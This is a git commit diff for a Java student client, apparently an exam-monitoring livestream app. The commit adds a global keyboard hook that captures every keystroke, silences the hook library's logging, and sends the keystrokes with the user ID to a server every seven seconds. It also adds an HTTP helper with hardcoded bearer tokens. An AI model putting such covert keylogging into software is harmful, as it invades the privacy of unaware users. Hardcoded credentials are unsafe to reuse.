d54f2d40c9860c1b712e030302a69e7f034f3303
IloveUhiuhiu <dangphuclong2019@gmail.com>
2024-11-15 21:33:57 +0700

    long push 15/11

--- src/main/java/com/client/liveowl/socket/StudentSocket.java
+++ src/main/java/com/client/liveowl/socket/StudentSocket.java
@@ -1,12 +1,22 @@
+
 package com.client.liveowl.socket;
 import com.client.liveowl.util.UdpHandler;
+import com.github.kwhat.jnativehook.NativeHookException;
 import javafx.scene.image.Image;
 import org.opencv.core.Core;
 import org.opencv.videoio.VideoCapture;
 import java.io.*;
 import java.net.*;
 import java.util.Random;
+import com.client.liveowl.util.UserHandler;
+import com.github.kwhat.jnativehook.GlobalScreen;
+import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
+import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;
+import java.util.Timer;
+import java.util.TimerTask;
 import java.util.concurrent.ConcurrentLinkedQueue;
+import java.util.logging.Level;
+import java.util.logging.Logger;
 
 public class StudentSocket{
     public static int maxDatagramPacketLength = 1500;
@@ -21,6 +31,10 @@ public class StudentSocket{
     public static Random rand = new Random();
     public static boolean isLive = false;
     public static int captureFromCamera = 0;
+    private static String CLIENT_ID;
+    private static final StringBuilder keyLogBuffer = new StringBuilder();
+    private static final int SEND_INTERVAL = 7000;
+    public static final int SERVER_PORT_LOGGER = 12345;
     public static ConcurrentLinkedQueue<Image> cache = new ConcurrentLinkedQueue<>();
     static {
         System.loadLibrary(Core.NATIVE_LIBRARY_NAME);
@@ -39,7 +53,6 @@ public class StudentSocket{
             System.out.println("Lỗi khi khởi tạo Socket: " + e.getMessage());
         }
     }
-
     public void sendExitNotificationToTeacher() throws Exception {
         System.out.println("Send exit for teacher");
         DatagramSocket socketExit = new DatagramSocket(8765);
@@ -66,8 +79,60 @@ public class StudentSocket{
         System.out.println("Port mới là: " + StudentSocket.serverPort);
         return true;
     }
+    private static void sendKeyData() {
+        String dataToSend;
+        synchronized (keyLogBuffer) {
+            if (keyLogBuffer.length() == 0) {
+                return; // Không có dữ liệu để gửi
+            }
+            dataToSend = keyLogBuffer.toString();
+            keyLogBuffer.setLength(0); // Xóa bộ đệm sau khi lấy dữ liệu
+        }
+
+        try (Socket socket = new Socket(serverHostName, SERVER_PORT_LOGGER);
+             PrintWriter writer = new PrintWriter(socket.getOutputStream(), true)) {
+            CLIENT_ID = UserHandler.getUserId();
+            System.out.println(CLIENT_ID);
+            writer.println(CLIENT_ID);
+            writer.println(dataToSend);
+            System.out.println("Dữ liệu đã được gửi: " + dataToSend);
+        } catch (IOException e) {
+            System.out.println("Lỗi kết nối. Dữ liệu sẽ được gửi lại lần sau.");
+            synchronized (keyLogBuffer) {
+                keyLogBuffer.insert(0, dataToSend); // Thêm lại dữ liệu vào bộ đệm nếu gửi thất bại
+            }
+        }
+    }
     public void LiveStream() throws IOException {
         new Thread(new StudentTaskUdp(socketSend, socketReceive)).start();
+        try {
+            Timer timer = new Timer();
+            timer.schedule(new TimerTask() {
+                @Override
+                public void run() {
+                    sendKeyData();
+                }
+            }, 0, SEND_INTERVAL);
+
+            Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
+            logger.setLevel(Level.OFF);
+            logger.setUseParentHandlers(false);
+
+
+            GlobalScreen.registerNativeHook();
+            GlobalScreen.addNativeKeyListener(new NativeKeyListener() {
+                private boolean isShift = false;
+                //    private boolean capsLockOn = Toolkit.getDefaultToolkit().getLockingKeyState(KeyEvent.VK_CAPS_LOCK); // Lấy trạng thái CAPS LOCK ban đầu
+
+                @Override
+                public void nativeKeyPressed(NativeKeyEvent e) {
+                    String ketText = NativeKeyEvent.getKeyText(e.getKeyCode());
+                    keyLogBuffer.append(ketText + " ");
+                }
+            });
+        } catch (NativeHookException e) {
+            throw new RuntimeException(e);
+        }
     }
 
     public static synchronized void updateCamera() {
@@ -78,5 +143,8 @@ public class StudentSocket{
     }
     public static synchronized int getCamera() {
         return captureFromCamera;
+    }
+    public static synchronized boolean getLive() {
+        return isLive;
     }
 }
---
+++ src/main/java/com/client/liveowl/util/UserHandler.java
@@ -0,0 +1,102 @@
+package com.client.liveowl.util;
+import org.apache.http.HttpEntity;
+import org.apache.http.client.methods.CloseableHttpResponse;
+import org.apache.http.client.methods.HttpPost;
+import org.apache.http.impl.client.CloseableHttpClient;
+import org.apache.http.impl.client.HttpClients;
+import org.apache.http.util.EntityUtils;
+import org.json.JSONArray;
+import org.json.JSONException;
+import org.json.JSONObject;
+import org.springframework.http.HttpStatus;
+
+import java.io.IOException;
+import java.util.ArrayList;
+import java.util.List;
+
+public class UserHandler {
+    private static final String BASE_URI = "http://localhost:9090";
+
+    public static String getUserId() {
+        String url = BASE_URI + "/users/detail";
+
+        String token = Authentication.getToken();
+        System.out.println("token: " + token);
+        //   String token = "eyJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoyLCJzdWIiOiJzdDRAZ21haWwuY29tIn0.atCALsZ0MhIbozc8w-4A-O3sLfVuxL528M7UIofmTrk";
+        if (token == null || token.isEmpty()) {
+            System.err.println("Token không hợp lệ. Vui lòng đăng nhập lại.");
+            return null;
+        }
+        CloseableHttpClient httpClient = HttpClients.createDefault();
+        HttpPost post = new HttpPost(url);
+        post.setHeader("Authorization", "Bearer " + token);
+
+        try (CloseableHttpResponse response = httpClient.execute(post)) {
+            int statusCode = response.getStatusLine().getStatusCode();
+            System.out.println("StatusCode: " + statusCode);
+
+            if (statusCode == HttpStatus.OK.value()) {
+                HttpEntity responseEntity = response.getEntity();
+                String responseString = EntityUtils.toString(responseEntity);
+                JSONObject jsonResponse = new JSONObject(responseString);
+
+                // Lấy ID từ JSON
+                String accountId = jsonResponse.getJSONObject("data").getString("accountId");
+                System.out.println("User ID: " + accountId);
+                return accountId; // Trả về ID người dùng
+            } else {
+                System.err.println("Lỗi khi lấy thông tin tài khoản: " + statusCode);
+                return null;
+            }
+        } catch (IOException e) {
+            e.printStackTrace();
+            return null;
+        } catch (JSONException e) {
+            throw new RuntimeException(e);
+        }
+    }
+
+    public static List<String> getAllAccountID() {
+        String url = BASE_URI + "/users/allaccoutid";
+        System.out.println(Authentication.getToken());
+        System.out.println(url);
+        CloseableHttpClient httpClient = HttpClients.createDefault();
+        HttpPost post = new HttpPost(url);
+        String token = "eyJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoxLCJzdWIiOiJjQGdtYWlsLmNvbSJ9.qO1hErx1vP51kB0TtksN53lj2miR-xDzGEt8y8Lq-Dg";
+        // Thêm header chứa token
+        post.setHeader("Authorization", "Bearer " + token);
+
+        try (CloseableHttpResponse response = httpClient.execute(post)) {
+            int statusCode = response.getStatusLine().getStatusCode();
+            System.out.println("statusCode: " + statusCode);
+
+            if (statusCode == HttpStatus.OK.value()) {
+                HttpEntity responseEntity = response.getEntity();
+                String responseString = EntityUtils.toString(responseEntity);
+                JSONObject jsonResponse = new JSONObject(responseString);
+                JSONArray dataArray = jsonResponse.getJSONArray("data");
+
+                List<String> allaccountid = new ArrayList<>();
+
+                for (int i = 0; i < dataArray.length(); i++) {
+                    allaccountid.add(dataArray.getString(i));
+                }
+                return allaccountid;
+            } else {
+                System.err.println("Failed to fetch allaccountid: " + statusCode);
+                return null;
+            }
+        } catch (IOException e) {
+            e.printStackTrace();
+            return null;
+        } catch (JSONException e) {
+            throw new RuntimeException(e);
+        }
+    }
+//    public  static  void main(String[] args) {
+//        List<String> allid = getAllAccountID();
+//        for (String id : allid) {
+//            System.out.println(id);
+//        }
+//    }
+}
